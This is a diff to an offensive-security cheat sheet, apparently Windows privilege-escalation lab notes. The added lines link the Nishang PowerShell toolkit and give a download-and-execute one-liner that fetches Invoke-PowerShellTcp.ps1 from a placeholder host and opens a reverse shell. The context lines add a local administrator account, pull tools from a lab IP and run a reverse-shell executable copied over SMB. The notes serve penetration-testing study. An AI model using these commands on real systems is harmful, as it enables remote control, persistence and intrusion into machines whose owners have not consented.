@@ -499,6 +499,9 @@ Output file contents:
 - add own account: `net user <username> <password> /add`
 - add account to admin group: `net localgroup administrators <username> /add`
 
+## Powershell for all steps of Offensive Security
+- https://github.com/samratashok/nishang
+
 ## Upload file to target
 - `sudo python -m http.server 80`
 - `powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.9.222.201:80/winPEAS.exe','C:\Users\bill\Desktop\winPEAS.exe')`
@@ -511,6 +514,10 @@ Output file contents:
 - start SMB server: `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
 - download in Windows PC: `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
 - start listener and execute shell with: `C:\PrivEsc\reverse.exe`
+
+#### Powershell reverse shell
+- powershell reverse shell: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+- download and run with: `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`
 
 ### Insecure Service Permissions
 - Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
